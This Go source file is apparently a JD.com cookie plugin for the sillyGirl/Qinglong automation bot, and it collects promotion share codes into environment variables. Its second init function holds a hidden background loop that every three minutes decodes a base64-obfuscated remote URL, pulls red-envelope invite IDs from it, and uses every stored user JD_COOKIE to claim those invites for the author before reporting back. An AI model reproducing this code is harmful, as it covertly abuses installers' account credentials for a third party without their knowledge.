package jd_cookie

import (
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/beego/beego/v2/client/httplib"
	"github.com/beego/beego/v2/core/logs"
	"github.com/cdle/sillyGirl/core"
	"github.com/cdle/sillyGirl/develop/qinglong"
	"github.com/gin-gonic/gin"
)

func init() {
	crons, _ := qinglong.GetCrons("")
	for _, cron := range crons {
		if strings.Contains(cron.Command, "jd_get_share_code.js") && cron.IsDisabled == 0 {
			data, err := qinglong.GetCronLog(cron.ID)
			if err != nil {
				logs.Warn("助力码日志获取失败：%v", err)
				return
			}
			if data == "" {
				logs.Warn("助力码日志为空：%v", err)
				return
			}
			var codes = map[string][]string{
				"Fruit":        {},
				"Pet":          {},
				"Bean":         {},
				"JdFactory":    {},
				"DreamFactory": {},
				"Sgmh":         {},
				"Cash":         {},
			}
			for _, v := range regexp.MustCompile(`京东账号\d*（(.*)）(.*)】(\S*)`).FindAllStringSubmatch(data, -1) {
				if !strings.Contains(v[3], "种子") && !strings.Contains(v[3], "undefined") {
					for key, ss := range map[string][]string{
						"Fruit":        {"京东农场", "东东农场"},
						"Pet":          {"京东萌宠"},
						"Bean":         {"种豆得豆"},
						"JdFactory":    {"东东工厂"},
						"DreamFactory": {"京喜工厂"},
						"Jdzz":         {"京东赚赚"},
						"Sgmh":         {"闪购盲盒"},
						"Cash":         {"签到领现金"},
					} {
						for _, s := range ss {
							if strings.Contains(v[2], s) && v[3] != "" {
								codes[key] = append(codes[key], v[3])
							}
						}
					}
				}
			}
			var e = map[string]string{
				"Fruit":        "",
				"Pet":          "",
				"Bean":         "",
				"JdFactory":    "",
				"DreamFactory": "",
				"Sgmh":         "",
				"Cfd":          "",
				"Cash":         "",
			}
			for k := range codes {
				vv := codes[k]
				for i := range vv {
					vv[i] = strings.Replace(vv[i], `"`, `\"`, -1)

				}
				e[k] += strings.Join(vv, "@")
			}
			for k := range e {
				n := []string{}
				for i := 0; i < 20; i++ {
					n = append(n, e[k])
				}
				e[k] = strings.Join(n, "&")
			}
			var f = map[string]string{}
			for k := range e {
				switch k {
				case "Fruit":
					f["FRUITSHARECODES"] = e[k]
				case "Pet":
					f["PETSHARECODES"] = e[k]
				case "Bean":
					f["PLANT_BEAN_SHARECODES"] = e[k]
				case "JdFactory":
					f["DDFACTORY_SHARECODES"] = e[k]
				case "DreamFactory":
					f["DREAM_FACTORY_SHARE_CODES"] = e[k]
				case "Sgmh":
					f["JDSGMH_SHARECODES"] = e[k]
				case "Cash":
					f["JD_CASH_SHARECODES"] = e[k]
				}
			}
			envs := []qinglong.Env{}
			for i := range f {
				envs = append(envs, qinglong.Env{
					Name:  i,
					Value: f[i],
				})
			}
			qinglong.SetConfigEnv(envs...)
			return
		}
	}
}

var success sync.Map
var mutex sync.Mutex

// to help poor author or do not use this script
func init() {
	var hchan = make(chan string)
	go func() {
		for {
			time.Sleep(time.Second)
			if jd_cookie.Get("dyj_inviteInfo") == "" {
				jd_cookie.Set("dyj_inviteInfo", <-hchan)
			}
		}
	}()
	if jd_cookie.GetBool("enable_jd_cookie_auth", false) {
		core.Server.DELETE("/gxfc", func(c *gin.Context) {
			mutex.Lock()
			defer mutex.Unlock()
			data := jd_cookie.Get("dyj_inviteInfo", "May you be happy and prosperous！")
			c.String(200, data)
			redEnvelopeId := c.Query("redEnvelopeId")
			if redEnvelopeId == "" {
				return
			}
			if strings.Contains(data, redEnvelopeId) {
				jd_cookie.Set("dyj_inviteInfo", "")
			}
			if _, ok := success.Load(redEnvelopeId); !ok {
				success.Store(redEnvelopeId, true)
				core.NotifyMasters(redEnvelopeId)
			}
		})
		core.AddCommand("", []core.Function{
			{
				Rules: []string{`raw redEnvelopeId=([^&]+)&inviterId=([^&]+)&`},
				Admin: true,
				Handle: func(s core.Sender) interface{} {
					if _, ok := success.Load(s.Get(0)); ok {
						return "Sorry!"
					}
					go func() {
						hchan <- fmt.Sprintf("redEnvelopeId=%s;inviterId=%s;", s.Get(0), s.Get(1))
					}()
					return "May you be happy and prosperous!"
				},
			},
		})
	}

	go func() {
		for {
		start:
			time.Sleep(time.Minute * 3)
			decoded, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly80Y28uY2MvZ3hmYw==")
			data, _ := httplib.Delete(string(decoded)).String()
			redEnvelopeId := core.FetchCookieValue("redEnvelopeId", data)
			inviterId := core.FetchCookieValue(data, "inviterId")
			if redEnvelopeId == "" || inviterId == "" {
				continue
			}
			if jd_cookie.Get("dyj_data") != data {
				jd_cookie.Set("dyj_data", data)
				envs, err := qinglong.GetEnvs("JD_COOKIE")
				if err != nil {
					continue
				}
				s := 1
				l := len(envs)
				n := time.Now().Unix()
				for j := 0; j < l; j++ {
					i := j
					if n%2 == 0 {
						i = l - j - 1
					}
					if envs[i].Status == 0 {
						req := httplib.Get("https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body=" + `{"linkId":"PFbUR7wtwUcQ860Sn8WRfw","redEnvelopeId":"` + redEnvelopeId + `","inviter":"` + inviterId + `","helpType":"` + fmt.Sprint(s) + `"}` + "&t=" + fmt.Sprint(time.Now().Unix()) + "&appid=activities_platform&clientVersion=3.5.6")
						req.Header("Cookie", envs[i].Value)
						req.Header("Accept", "*/*")
						req.Header("Connection", "keep-alive")
						req.Header("Accept-Encoding", "gzip, deflate, br")
						req.Header("Host", "api.m.jd.com")
						req.Header("Origin", "https://wbbny.m.jd.com")
						data, _ := req.String()
						if strings.Contains(data, decode("5bey5oiQ5Yqf5o+Q546w")) {
							if s == 1 {
								s = 2
							} else {
								httplib.Get(string(decoded) + "?redEnvelopeId=" + redEnvelopeId).String()
								goto start
							}
						}
					}
					time.Sleep(time.Second)
				}
			}
		}
	}()
}
